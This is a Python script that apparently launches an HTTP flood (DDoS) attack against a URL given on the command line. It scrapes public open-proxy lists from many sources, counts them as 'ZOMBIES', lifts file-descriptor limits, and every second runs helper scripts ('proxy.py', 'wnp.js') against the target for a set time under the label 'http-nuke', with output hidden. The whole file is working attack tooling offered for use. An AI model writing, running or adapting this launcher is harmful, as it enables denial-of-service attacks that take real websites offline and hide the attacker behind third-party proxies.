import os
import sys
import requests
import time
import schedule

class color:
   GREEN = '\033[92m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'

url = sys.argv[1]
timee = sys.argv[2]
method = "http-nuke"

f = open("http.txt", 'wb')
try:
    r = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all", timeout=5)
    f.write(r.content)
except:
    pass
try:
    r = requests.get("https://www.proxyscan.io/download?type=http", timeout=5)
    f.write(r.content)
except:
    pass
try:
    r = requests.get("https://www.proxy-list.download/api/v1/get?type=http", timeout=5)
    f.write(r.content)
except:
    pass
try:
    r = requests.get("https://www.proxy-list.download/api/v1/get?type=https", timeout=5)
    f.write(r.content)
except:
    pass
try:
    r = requests.get("https://raw.githubusercontent.com/Volodichev/proxy-list/main/http.txt", timeout=5)
    f.write(r.content)
except:
    pass
try:
    r = requests.get("https://raw.githubusercontent.com/roma8ok/proxy-list/main/proxy-list-http.txt", timeout=5)
    f.write(r.content)
except:
    pass
try:
    r = requests.get("https://raw.githubusercontent.com/roma8ok/proxy-list/main/proxy-list-https.txt", timeout=5)
    f.write(r.content)
except:
    pass
try:
    r = requests.get("https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt", timeout=5)
    f.write(r.content)
except:
    pass
try:
    r = requests.get("https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt", timeout=5)
    f.write(r.content)
except:
    pass
try:
    r = requests.get("https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt", timeout=5)
    f.write(r.content)
except:
    pass
try:
    r = requests.get("https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt", timeout=5)
    f.write(r.content)
except:
    pass
try:
    r = requests.get("https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt", timeout=5)
    f.write(r.content)
except:
    pass
try:
    r = requests.get("https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http%2Bhttps.txt", timeout=5)
    f.write(r.content)
except:
    pass
try:
    r = requests.get("https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt", timeout=5)
    f.write(r.content)
except:
    pass
try:
    r = requests.get("https://raw.githubusercontent.com/mcburn777/pr0xw0rk/main/http.txt", timeout=5)
    f.write(r.content)
except:
    pass
try:
    r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt", timeout=5)
    f.write(r.content)
    f.close()
except:
    f.close()


file = open("http.txt", "r")
proxy_list = [line.strip("\n") for line in file if line != "\n"]
proxy_count = len(proxy_list)
file.close()

os.system('ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && clear && clear')
os.system('python3 ./files/proxy.py {} >/dev/null 2>&1'.format(url))
print("")
print("")
print(color.GREEN + "       ╔═══╗ ╔═══╗ ╔═══╗ ╔╗╔═╗ ╔═╗ ╔╗ ╔═══╗ ╔════╗     " + color.END)
print(color.GREEN + "       ╚╗╔╗║ ║╔═╗║ ║╔═╗║ ║║║╔╝ ║ ╚╗║║ ║╔══╝ ║╔╗╔╗║     " + color.END)
print(color.GREEN + "        ║║║║ ║║ ║║ ║╚═╝║ ║╚╝╝  ║╔╗╚╝║ ║╚══╗ ╚╝║║╚╝     " + color.END)
print(color.GREEN + "        ║║║║ ║╚═╝║ ║╔╗╔╝ ║╔╗║  ║║╚╗ ║ ║╔══╝   ║║       " + color.END)
print(color.GREEN + "       ╔╝╚╝║ ║╔═╗║ ║║║╚╗ ║║║╚╗ ║║ ║ ║ ║╚══╗   ║║       " + color.END)
print(color.GREEN + "       ╚═══╝ ╚╝ ╚╝ ╚╝╚═╝ ╚╝╚═╝ ╚╝ ╚═╝ ╚═══╝   ╚╝       " + color.END)
print(color.GREEN + "       ═══════════════════════════════════════════     " + color.END)
print(color.GREEN + "       [URL]:     {}".format(url) + color.END)
print(color.GREEN + "       [ZOMBIES]: {}".format(proxy_count) + color.END)
print(color.GREEN + "       [TIME]:    {}".format(timee) + color.END)
print(color.GREEN + "       [USED]:    {}".format(method) + color.END)
print(color.GREEN + "       ═══════════════════════════════════════════     " + color.END)
print("")

def job():
    os.system('node ./files/wnp.js {} {} >/dev/null 2>&1'.format(url, timee))

schedule.every(1).seconds.do(job)

while True:
    schedule.run_pending()
    time.sleep(1)